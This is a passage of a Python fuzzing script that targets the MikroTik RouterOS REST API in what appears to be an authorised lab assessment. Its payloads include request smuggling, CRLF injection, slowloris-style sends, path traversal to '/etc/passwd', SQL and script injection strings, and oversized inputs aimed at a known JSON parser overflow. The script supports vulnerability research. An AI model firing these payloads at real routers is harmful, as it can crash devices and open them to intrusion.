#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — REST API JSON Parser Fuzzer
Phase 3: Fuzzing — Strategy targets the parse_json_element code path
(CVE-2025-10948 buffer overflow area) and HTTP layer parsing.

~300 test cases across three strategies:
  1. Mutation-based JSON fuzzing (~150 tests)
  2. HTTP layer fuzzing (~100 tests)
  3. Generation-based extreme value fuzzing (~50 tests)

Target: [REDACTED-INTERNAL-IP], admin/TestPass123
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

import copy
import json
import random
import socket
import string
import struct
import time
import traceback

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Configuration ────────────────────────────────────────────────────────────

REST_BASE = f"http://{TARGET}/rest"
AUTH = (ADMIN_USER, ADMIN_PASS)
DEFAULT_TIMEOUT = 15          # seconds per request
SLOW_THRESHOLD = 5.0          # seconds — flag as anomaly
ALIVE_CHECK_INTERVAL = 10     # check router every N tests
MAX_PAYLOAD_LOG = 2000        # truncate logged payloads to this length

# ── Base Payloads — real RouterOS REST API endpoints ─────────────────────────

BASE_PAYLOADS = [
    {
        "endpoint": "/system/identity",
        "method": "POST",
        "body": {"name": "TestRouter"},
        "cleanup_endpoint": "/system/identity",
        "cleanup_body": {"name": "MikroTik"},
        "cleanup_method": "POST",
    },
    {
        "endpoint": "/ip/address/add",
        "method": "POST",
        "body": {"address": "[REDACTED-INTERNAL-IP]/24", "interface": "ether1"},
        "cleanup_endpoint": "/ip/address",
        "cleanup_field": "address",
        "cleanup_match": "192.168.99",
    },
    {
        "endpoint": "/user/add",
        "method": "POST",
        "body": {"name": "fuzzuser", "group": "read", "password": "test123"},
        "cleanup_endpoint": "/user",
        "cleanup_field": "name",
        "cleanup_match": "fuzzuser",
    },
    {
        "endpoint": "/system/script/add",
        "method": "POST",
        "body": {"name": "fuzzscript", "source": ":log info test"},
        "cleanup_endpoint": "/system/script",
        "cleanup_field": "name",
        "cleanup_match": "fuzzscript",
    },
    {
        "endpoint": "/ip/firewall/filter/add",
        "method": "POST",
        "body": {"chain": "input", "action": "accept", "comment": "fuzz-test"},
        "cleanup_endpoint": "/ip/firewall/filter",
        "cleanup_field": "comment",
        "cleanup_match": "fuzz-test",
    },
]

# ── Utility Functions ────────────────────────────────────────────────────────

def truncate(data, maxlen=MAX_PAYLOAD_LOG):
    """Truncate data for logging."""
    s = str(data)
    if len(s) > maxlen:
        return s[:maxlen] + f"...[truncated, total {len(s)}]"
    return s


def cleanup_created_objects():
    """Delete any objects created during fuzzing (users, scripts, addresses, rules)."""
    log("Cleaning up created objects...")
    cleanup_targets = [
        ("/user", "name", ["fuzzuser"]),
        ("/system/script", "name", ["fuzzscript"]),
        ("/ip/address", "address", ["192.168.99"]),
        ("/ip/firewall/filter", "comment", ["fuzz-test"]),
    ]

    for endpoint, field, patterns in cleanup_targets:
        try:
            r = requests.get(
                f"{REST_BASE}{endpoint}",
                auth=AUTH, timeout=10, verify=False)
            if r.status_code == 200:
                items = r.json()
                if isinstance(items, list):
                    for item in items:
                        val = item.get(field, "")
                        if any(p in str(val) for p in patterns):
                            item_id = item.get(".id")
                            if item_id:
                                requests.delete(
                                    f"{REST_BASE}{endpoint}/{item_id}",
                                    auth=AUTH, timeout=10, verify=False)
                                log(f"  Deleted {endpoint} item {item_id} ({field}={val})")
        except Exception as e:
            log(f"  Cleanup warning for {endpoint}: {e}")


def send_json_request(endpoint, body, method="POST", timeout=DEFAULT_TIMEOUT):
    """Send a JSON request via the requests library. Returns result dict."""
    url = f"{REST_BASE}{endpoint}"
    start = time.time()
    result = {
        "endpoint": endpoint,
        "method": method,
        "status_code": 0,
        "response_size": 0,
        "response_time": 0,
        "response_body": "",
        "error": None,
    }

    try:
        if method == "POST":
            r = requests.post(
                url, auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=body, timeout=timeout, verify=False)
        elif method == "PUT":
            r = requests.put(
                url, auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=body, timeout=timeout, verify=False)
        elif method == "PATCH":
            r = requests.patch(
                url, auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=body, timeout=timeout, verify=False)
        else:
            r = requests.request(
                method, url, auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=body, timeout=timeout, verify=False)

        elapsed = time.time() - start
        result["status_code"] = r.status_code
        result["response_size"] = len(r.content)
        result["response_time"] = round(elapsed, 3)
        result["response_body"] = truncate(r.text, 500)

    except requests.exceptions.Timeout:
        result["error"] = "timeout"
        result["response_time"] = round(time.time() - start, 3)
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"connection_error: {truncate(str(e), 200)}"
        result["response_time"] = round(time.time() - start, 3)
    except Exception as e:
        result["error"] = f"exception: {truncate(str(e), 200)}"
        result["response_time"] = round(time.time() - start, 3)

    return result


def send_raw_http(raw_request, timeout=DEFAULT_TIMEOUT):
    """Send a raw HTTP request over a TCP socket. Returns result dict."""
    start = time.time()
    result = {
        "method": "raw_socket",
        "status_code": 0,
        "response_size": 0,
        "response_time": 0,
        "response_body": "",
        "error": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((TARGET, PORTS["http"]))

        if isinstance(raw_request, str):
            raw_request = raw_request.encode("latin-1")
        sock.sendall(raw_request)

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                # Don't read forever — if we have a full response, stop
                if len(response) > 100000:
                    break
            except socket.timeout:
                break

        sock.close()
        elapsed = time.time() - start

        result["response_size"] = len(response)
        result["response_time"] = round(elapsed, 3)

        # Parse HTTP status code from response
        resp_text = response.decode("latin-1", errors="replace")
        result["response_body"] = truncate(resp_text, 500)
        if resp_text.startswith("HTTP/"):
            parts = resp_text.split(" ", 2)
            if len(parts) >= 2:
                try:
                    result["status_code"] = int(parts[1])
                except ValueError:
                    pass

    except socket.timeout:
        result["error"] = "timeout"
        result["response_time"] = round(time.time() - start, 3)
    except ConnectionRefusedError:
        result["error"] = "connection_refused"
        result["response_time"] = round(time.time() - start, 3)
    except Exception as e:
        result["error"] = f"exception: {truncate(str(e), 200)}"
        result["response_time"] = round(time.time() - start, 3)

    return result


def send_raw_slow(raw_bytes, delay_per_byte=1.0, max_bytes=10, timeout=DEFAULT_TIMEOUT):
    """Send bytes one at a time with a delay (slowloris-style). Returns result dict."""
    start = time.time()
    result = {
        "method": "raw_slow",
        "status_code": 0,
        "response_size": 0,
        "response_time": 0,
        "response_body": "",
        "error": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((TARGET, PORTS["http"]))

        if isinstance(raw_bytes, str):
            raw_bytes = raw_bytes.encode("latin-1")

        for i, b in enumerate(raw_bytes[:max_bytes]):
            sock.send(bytes([b]))
            time.sleep(delay_per_byte)

        # Send the rest normally
        if len(raw_bytes) > max_bytes:
            sock.sendall(raw_bytes[max_bytes:])

        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()
        elapsed = time.time() - start

        result["response_size"] = len(response)
        result["response_time"] = round(elapsed, 3)
        resp_text = response.decode("latin-1", errors="replace")
        result["response_body"] = truncate(resp_text, 500)
        if resp_text.startswith("HTTP/"):
            parts = resp_text.split(" ", 2)
            if len(parts) >= 2:
                try:
                    result["status_code"] = int(parts[1])
                except ValueError:
                    pass

    except socket.timeout:
        result["error"] = "timeout"
        result["response_time"] = round(time.time() - start, 3)
    except Exception as e:
        result["error"] = f"exception: {truncate(str(e), 200)}"
        result["response_time"] = round(time.time() - start, 3)

    return result


def make_auth_header():
    """Return base64-encoded Basic auth header value."""
    import base64
    creds = f"{ADMIN_USER}:{ADMIN_PASS}"
    return "Basic " + base64.b64encode(creds.encode()).decode()


def build_raw_post(path, body, extra_headers=None, http_version="1.1",
                   method="POST", content_type="application/json",
                   content_length=None):
    """Build a raw HTTP POST request string."""
    if isinstance(body, (dict, list)):
        body_str = json.dumps(body)
    elif isinstance(body, bytes):
        body_str = body.decode("latin-1", errors="replace")
    else:
        body_str = str(body)

    if content_length is None:
        content_length = len(body_str.encode("latin-1"))

    lines = [
        f"{method} /rest{path} HTTP/{http_version}",
        f"Host: {TARGET}",
        f"Authorization: {make_auth_header()}",
    ]
    if content_type:
        lines.append(f"Content-Type: {content_type}")
    lines.append(f"Content-Length: {content_length}")

    if extra_headers:
        for h in extra_headers:
            lines.append(h)

    lines.append("")
    lines.append(body_str)

    return "\r\n".join(lines)


# ── Mutation Generators ──────────────────────────────────────────────────────

def mutate_long_strings(body, field):
    """Replace string values with increasingly long strings."""
    lengths = [100, 1000, 10000, 65535, 100000]
    mutations = []
    for length in lengths:
        mutated = copy.deepcopy(body)
        mutated[field] = "A" * length
        mutations.append((f"long_string_{length}", mutated))
    return mutations


def mutate_format_strings(body, field):
    """Replace string values with format string specifiers."""
    payloads = [
        "%s" * 50,
        "%x" * 50,
        "%n" * 20,
        "%p" * 50,
        "%s%x%n%p" * 25,
        "AAAA" + "%08x." * 20,
    ]
    mutations = []
    for i, p in enumerate(payloads):
        mutated = copy.deepcopy(body)
        mutated[field] = p
        mutations.append((f"format_string_{i}", mutated))
    return mutations


def mutate_null_bytes(body, field):
    """Replace string values with null byte patterns."""
    payloads = [
        "\x00",
        "A\x00B",
        "\x00" * 1000,
        "A" * 100 + "\x00" + "B" * 100,
        "\x00A\x00B\x00C\x00",
    ]
    mutations = []
    for i, p in enumerate(payloads):
        mutated = copy.deepcopy(body)
        mutated[field] = p
        mutations.append((f"null_bytes_{i}", mutated))
    return mutations


def mutate_special_chars(body, field):
    """Replace string values with special characters."""
    payloads = [
        string.printable,
        "".join(chr(c) for c in range(0, 32)),      # all control chars
        "".join(chr(c) for c in range(127, 256)),    # high ASCII
        "<script>alert(1)</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${7*7}{{7*7}}",
    ]
    mutations = []
    for i, p in enumerate(payloads):
        mutated = copy.deepcopy(body)
        mutated[field] = p
        mutations.append((f"special_chars_{i}", mutated))
    return mutations


def mutate_integer_boundaries(body, field):
    """Replace values with integer edge cases."""
    values = [
        0, -1,
        2**31 - 1,   # INT32_MAX
        2**31,        # INT32_MAX + 1
        2**32 - 1,   # UINT32_MAX
        2**63 - 1,   # INT64_MAX
        -2**31,       # INT32_MIN
        -2**63,       # INT64_MIN
    ]
    mutations = []
    for v in values:
        mutated = copy.deepcopy(body)
        mutated[field] = v
        mutations.append((f"int_boundary_{v}", mutated))
    return mutations


def mutate_wrong_types(body, field):
    """Replace values with wrong types."""
    wrong = [
        ("number", 12345),
        ("array", [1, 2, 3]),
        ("object", {"nested": "value"}),
        ("null", None),
        ("bool_true", True),
        ("bool_false", False),
        ("empty_string", ""),
        ("empty_array", []),
        ("empty_object", {}),
    ]
    mutations = []
    for tname, val in wrong:
        mutated = copy.deepcopy(body)
        mutated[field] = val
        mutations.append((f"wrong_type_{tname}", mutated))
    return mutations


def mutate_extra_fields(body):
    """Add unexpected/malicious extra fields."""
    extras = [
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {}}},
        {"__proto__": {"isAdmin": True, "role": "admin"}},
        {".propfind": True},
        {"$where": "1==1"},
        {"__class__": {"__init__": {"__globals__": {}}}},
        {"_id": "000000000000000000000000"},
        {"admin": True, "group": "full", "superuser": True},
    ]
    mutations = []
    for i, extra in enumerate(extras):
        mutated = copy.deepcopy(body)
        mutated.update(extra)
        mutations.append((f"extra_fields_{i}", mutated))
    return mutations


def mutate_nested_objects(body, field):
    """Replace value with deeply nested objects."""
    depths = [10, 50, 100, 500]
    mutations = []
    for depth in depths:
        nested = "value"
        for _ in range(depth):
            nested = {"a": nested}
        mutated = copy.deepcopy(body)
        mutated[field] = nested
        mutations.append((f"nested_depth_{depth}", mutated))
    return mutations


def mutate_large_arrays(body, field):
    """Replace value with large arrays."""
    sizes = [100, 1000, 10000]
    mutations = []
    for size in sizes:
        mutated = copy.deepcopy(body)
        mutated[field] = [0] * size
        mutations.append((f"large_array_{size}", mutated))
    return mutations


def mutate_unicode(body, field):
    """Replace value with Unicode edge cases."""
    payloads = [
        "\ufffd",                          # replacement character
        "\ud800",                          # lone high surrogate (invalid)
        "\u0000",                          # null
        "\uffff",                          # noncharacter
        "\U0001f4a9" * 100,                # pile of poo emoji repeated
        "\U0001f600\U0001f4a5\U0001f525",  # emoji sequence
        "\u202e" + "desrever",             # RTL override
        "\ufeff" * 100,                    # BOM repeated
        "\u0300" * 500,                    # combining diacritics
    ]
    mutations = []
    for i, p in enumerate(payloads):
        mutated = copy.deepcopy(body)
        try:
            mutated[field] = p
        except Exception:
            mutated[field] = repr(p)
        mutations.append((f"unicode_{i}", mutated))
    return mutations


# ── Strategy 1: Mutation-Based JSON Fuzzing ──────────────────────────────────

def run_strategy1_json_mutations(ec):
    """Mutation-based JSON fuzzing — ~150 tests."""
    log("=" * 60)
    log("STRATEGY 1: Mutation-Based JSON Fuzzing")
    log("=" * 60)

    crash_count = 0
    anomaly_count = 0
    test_index = 0

    for bp in BASE_PAYLOADS:
        endpoint = bp["endpoint"]
        body = bp["body"]
        # Pick the first string field to mutate
        string_fields = [k for k, v in body.items() if isinstance(v, str)]
        target_field = string_fields[0] if string_fields else list(body.keys())[0]

        log(f"\n--- Mutating endpoint: /rest{endpoint} (field: {target_field}) ---")

        # Collect all mutations for this endpoint
        all_mutations = []
        all_mutations.extend(mutate_long_strings(body, target_field))
        all_mutations.extend(mutate_format_strings(body, target_field))
        all_mutations.extend(mutate_null_bytes(body, target_field))
        all_mutations.extend(mutate_special_chars(body, target_field))
        all_mutations.extend(mutate_integer_boundaries(body, target_field))
        all_mutations.extend(mutate_wrong_types(body, target_field))
        all_mutations.extend(mutate_extra_fields(body))
        all_mutations.extend(mutate_nested_objects(body, target_field))
        all_mutations.extend(mutate_large_arrays(body, target_field))
        all_mutations.extend(mutate_unicode(body, target_field))

        # Limit to ~30 mutations per endpoint to stay around 150 total
        # Select a representative sample if too many
        if len(all_mutations) > 30:
            # Always keep first 3 of each type, then random sample
            selected = []
            seen_types = {}
            for name, mut in all_mutations:
                prefix = name.rsplit("_", 1)[0]
                if prefix not in seen_types:
                    seen_types[prefix] = 0
                if seen_types[prefix] < 3:
                    selected.append((name, mut))
                    seen_types[prefix] += 1

            # Fill remaining slots with random picks
            remaining = [(n, m) for n, m in all_mutations if (n, m) not in selected]
            random.shuffle(remaining)
            slots_left = 30 - len(selected)
            if slots_left > 0:
                selected.extend(remaining[:slots_left])
            all_mutations = selected

        for mut_name, mut_body in all_mutations:
            test_index += 1
            test_name = f"json_mutate_{endpoint.replace('/', '_')}_{mut_name}"

            result = send_json_request(endpoint, mut_body)

            is_anomaly = False
            anomaly_reasons = []

            if result["error"] == "timeout":
                is_anomaly = True
                anomaly_reasons.append("request timed out")
            elif result["error"] and "connection" in str(result["error"]).lower():
                is_anomaly = True
                anomaly_reasons.append(f"connection error: {result['error']}")
            elif result["response_time"] > SLOW_THRESHOLD:
                is_anomaly = True
                anomaly_reasons.append(f"slow response: {result['response_time']}s")
            elif result["status_code"] == 0:
                is_anomaly = True
                anomaly_reasons.append("no HTTP response received")
            elif result["status_code"] >= 500:
                is_anomaly = True
                anomaly_reasons.append(f"server error: HTTP {result['status_code']}")

            if is_anomaly:
                anomaly_count += 1

            details = {
                "mutation": mut_name,
                "endpoint": endpoint,
                "payload_preview": truncate(mut_body, 500),
                "http_status": result["status_code"],
                "response_size": result["response_size"],
                "response_time": result["response_time"],
                "error": result["error"],
                "response_preview": result["response_body"][:300] if result["response_body"] else None,
            }
            if anomaly_reasons:
                details["anomaly_reasons"] = anomaly_reasons

            ec.add_test(
                category="json_mutation",
                name=test_name,
                description=f"Mutation '{mut_name}' on {endpoint} field '{target_field}'",
                result="ANOMALY" if is_anomaly else f"HTTP {result['status_code']}",
                details=details,
                anomaly=is_anomaly,
            )

            # Check router health every ALIVE_CHECK_INTERVAL tests
            if test_index % ALIVE_CHECK_INTERVAL == 0:
                health = check_router_alive()
                if not health.get("alive"):
                    crash_count += 1
                    log(f"  ROUTER DOWN after test {test_index}! Waiting for recovery...")
                    ec.add_finding(
                        severity="HIGH",
                        title=f"Router crash/unresponsive after JSON mutation: {mut_name}",
                        description=(
                            f"Router became unresponsive after sending mutation "
                            f"'{mut_name}' to {endpoint}. "
                            f"Payload preview: {truncate(mut_body, 300)}"
                        ),
                        evidence_refs=[test_name],
                        cwe="CWE-120",
                    )
                    wait_for_router(max_wait=90)
                    time.sleep(5)  # extra settle time

        # Cleanup after each endpoint batch
        cleanup_created_objects()

    log(f"\nStrategy 1 complete: {test_index} tests, {anomaly_count} anomalies, {crash_count} crashes")
    return test_index, anomaly_count, crash_count


# ── Strategy 2: HTTP Layer Fuzzing ───────────────────────────────────────────

def run_strategy2_http_layer(ec):
    """HTTP layer fuzzing — ~100 tests using raw sockets."""
    log("=" * 60)
    log("STRATEGY 2: HTTP Layer Fuzzing")
    log("=" * 60)

    crash_count = 0
    anomaly_count = 0
    test_index = 0
    auth_header = make_auth_header()

    tests = []

    # ── 2.1: Request Smuggling (CL+TE, TE+CL, double CL) ───────────────────
    smuggling_payloads = [
        (
            "smuggle_cl_te",
            "CL+TE request smuggling",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: 20\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"GET /rest/system/resource HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"\r\n"
            ),
        ),
        (
            "smuggle_te_cl",
            "TE+CL request smuggling",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"{{\"name\":\"TestRouter\"}}\r\n"
                f"0\r\n"
                f"\r\n"
            ),
        ),
        (
            "smuggle_double_cl",
            "Double Content-Length headers",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: 22\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
                f'{{\"name\":\"TestRouter\"}}'
            ),
        ),
        (
            "smuggle_te_variants",
            "Transfer-Encoding obfuscation",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Transfer-Encoding: identity\r\n"
                f"\r\n"
                f"16\r\n"
                f'{{\"name\":\"TestRouter\"}}\r\n'
                f"0\r\n"
                f"\r\n"
            ),
        ),
        (
            "smuggle_te_space",
            "TE with trailing space",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding : chunked\r\n"
                f"Content-Length: 22\r\n"
                f"\r\n"
                f'{{\"name\":\"TestRouter\"}}'
            ),
        ),
    ]
    for name, desc, payload in smuggling_payloads:
        tests.append(("request_smuggling", name, desc, payload, "raw"))

    # ── 2.2: CRLF Injection ─────────────────────────────────────────────────
    crlf_payloads = [
        (
            "crlf_header_inject",
            "CRLF injection in custom header",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"X-Custom: value\r\nInjected: header\r\n"
                f"\r\n"
            ),
        ),
        (
            "crlf_double_response",
            "CRLF trying to split response",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"X-Custom: value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Injected</h1>\r\n"
                f"\r\n"
            ),
        ),
        (
            "crlf_null_in_header",
            "Null byte in header value",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"X-Custom: before\x00after\r\n"
                f"\r\n"
            ),
        ),
        (
            "crlf_header_folding",
            "Obsolete header folding (RFC 7230 forbids)",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"X-Folded: line1\r\n"
                f" continuation\r\n"
                f"\r\n"
            ),
        ),
    ]
    for name, desc, payload in crlf_payloads:
        tests.append(("crlf_injection", name, desc, payload, "raw"))

    # ── 2.3: Header Overflow ────────────────────────────────────────────────
    for size_name, size in [("10KB", 10240), ("100KB", 102400), ("1MB", 1048576)]:
        payload = (
            f"GET /rest/system/identity HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: {auth_header}\r\n"
            f"X-Overflow: {'A' * size}\r\n"
            f"\r\n"
        )
        tests.append((
            "header_overflow",
            f"header_overflow_{size_name}",
            f"Single header with {size_name} value",
            payload, "raw"
        ))

    # ── 2.4: Many Headers ──────────────────────────────────────────────────
    for count in [100, 500, 1000]:
        headers = "\r\n".join(f"X-Header-{i}: value-{i}" for i in range(count))
        payload = (
            f"GET /rest/system/identity HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: {auth_header}\r\n"
            f"{headers}\r\n"
            f"\r\n"
        )
        tests.append((
            "many_headers",
            f"many_headers_{count}",
            f"{count} custom headers in one request",
            payload, "raw"
        ))

    # ── 2.5: Chunked Encoding Abuse ────────────────────────────────────────
    chunked_payloads = [
        (
            "chunked_zero_length",
            "Zero-length chunk in body",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            ),
        ),
        (
            "chunked_huge_size",
            "Chunk size claiming 4GB",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"FFFFFFFF\r\n"
                f'{{\"name\":\"TestRouter\"}}\r\n'
                f"0\r\n"
                f"\r\n"
            ),
        ),
        (
            "chunked_malformed",
            "Malformed chunk encoding (no CRLF)",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"16\n"
                f'{{\"name\":\"TestRouter\"}}\n'
                f"0\n"
                f"\n"
            ),
        ),
        (
            "chunked_negative",
            "Negative chunk size",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"-1\r\n"
                f'{{\"name\":\"TestRouter\"}}\r\n'
                f"0\r\n"
                f"\r\n"
            ),
        ),
        (
            "chunked_overflow",
            "Chunk size integer overflow",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"FFFFFFFFFFFFFFFF\r\n"
                f'{{\"name\":\"TestRouter\"}}\r\n'
                f"0\r\n"
                f"\r\n"
            ),
        ),
    ]
    for name, desc, payload in chunked_payloads:
        tests.append(("chunked_abuse", name, desc, payload, "raw"))

    # ── 2.6: HTTP Version Probes ───────────────────────────────────────────
    version_payloads = [
        (
            "http_09",
            "HTTP/0.9 request (no headers)",
            f"GET /rest/system/identity\r\n",
        ),
        (
            "http_10",
            "HTTP/1.0 request",
            (
                f"GET /rest/system/identity HTTP/1.0\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "http_20_cleartext",
            "HTTP/2 PRI request over cleartext",
            f"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
        ),
        (
            "http_invalid_version",
            "Invalid HTTP version string",
            (
                f"GET /rest/system/identity HTTP/9.9\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "http_no_version",
            "Missing HTTP version",
            (
                f"GET /rest/system/identity\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
    ]
    for name, desc, payload in version_payloads:
        tests.append(("http_version", name, desc, payload, "raw"))

    # ── 2.7: Verb Tampering ────────────────────────────────────────────────
    verb_payloads = [
        (
            "verb_long",
            "Extremely long HTTP method name (10KB)",
            (
                f"{'A' * 10240} /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "verb_special_chars",
            "Method with special characters",
            (
                f"G\x00E\x01T /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "verb_unicode",
            "Method with Unicode chars",
            (
                f"\xc0\xae\xc0\xae /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "verb_empty",
            "Empty method",
            (
                f" /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
    ]
    for name, desc, payload in verb_payloads:
        tests.append(("verb_tampering", name, desc, payload, "raw"))

    # ── 2.8: URL Encoding Edge Cases ───────────────────────────────────────
    url_payloads = [
        (
            "url_double_encode",
            "Double URL encoding (%2561 = %61 = 'a')",
            (
                f"GET /rest/system/%2569%2564%2565%256e%2574%2569%2574%2579 HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "url_overlong_utf8",
            "Overlong UTF-8 encoding of '/'",
            (
                f"GET /rest/system\xc0\xafidentity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "url_null_byte",
            "Null byte in URL path",
            (
                f"GET /rest/system/identity%00.html HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "url_traversal",
            "Path traversal in URL",
            (
                f"GET /rest/../../../etc/passwd HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "url_long_path",
            "Extremely long URL path (10KB)",
            (
                f"GET /rest/{'A' * 10240} HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "url_fragment",
            "URL with fragment and query params",
            (
                f"GET /rest/system/identity?foo=bar&baz=qux#fragment HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
    ]
    for name, desc, payload in url_payloads:
        tests.append(("url_encoding", name, desc, payload, "raw"))

    # ── 2.9: Content-Length Mismatch ───────────────────────────────────────
    body_json = '{"name":"TestRouter"}'
    cl_payloads = [
        (
            "cl_larger_than_body",
            "Content-Length larger than actual body",
            build_raw_post("/system/identity", body_json,
                           content_length=len(body_json) + 1000),
        ),
        (
            "cl_smaller_than_body",
            "Content-Length smaller than actual body",
            build_raw_post("/system/identity", body_json,
                           content_length=5),
        ),
        (
            "cl_zero_with_body",
            "Content-Length=0 but body present",
            build_raw_post("/system/identity", body_json,
                           content_length=0),
        ),
        (
            "cl_negative",
            "Negative Content-Length",
            build_raw_post("/system/identity", body_json,
                           content_length=-1),
        ),
        (
            "cl_huge",
            "Extremely large Content-Length (4GB)",
            build_raw_post("/system/identity", body_json,
                           content_length=4294967295),
        ),
        (
            "cl_nan",
            "Content-Length as non-numeric string",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: NaN\r\n"
                f"\r\n"
                f'{body_json}'
            ),
        ),
    ]
    for name, desc, payload in cl_payloads:
        tests.append(("content_length", name, desc, payload, "raw"))

    # ── 2.10: Connection Handling (slow send) ──────────────────────────────
    slow_tests = [
        (
            "slow_headers",
            "Slow header send (1 byte/sec for 10 bytes)",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
            "slow",
        ),
        (
            "slow_body",
            "Slow body send (1 byte/sec)",
            build_raw_post("/system/identity", body_json),
            "slow",
        ),
    ]
    for name, desc, payload, mode in slow_tests:
        tests.append(("connection_handling", name, desc, payload, mode))

